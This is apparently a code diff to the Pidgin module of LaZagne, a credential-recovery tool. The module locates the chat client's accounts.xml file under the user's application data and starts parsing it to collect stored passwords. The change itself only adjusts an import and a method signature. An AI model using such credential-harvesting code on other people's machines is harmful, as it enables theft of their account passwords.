@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*- 
 import os
-import xml.etree.cElementTree as ET
+from xml.etree.cElementTree import ElementTree
 
 from lazagne.config.constant import constant
 from lazagne.config.module_info import ModuleInfo
@@ -10,10 +10,10 @@ class Pidgin(ModuleInfo):
     def __init__(self):
         ModuleInfo.__init__(self, 'pidgin', 'chats')
 
-    def run(self, software_name=None):
+    def run(self):
         path = os.path.join(constant.profile['APPDATA'], u'.purple', u'accounts.xml')
         if os.path.exists(path):
-            tree = ET.ElementTree(file=path)
+            tree = ElementTree(file=path)
             root = tree.getroot()
             pwd_found = []
 
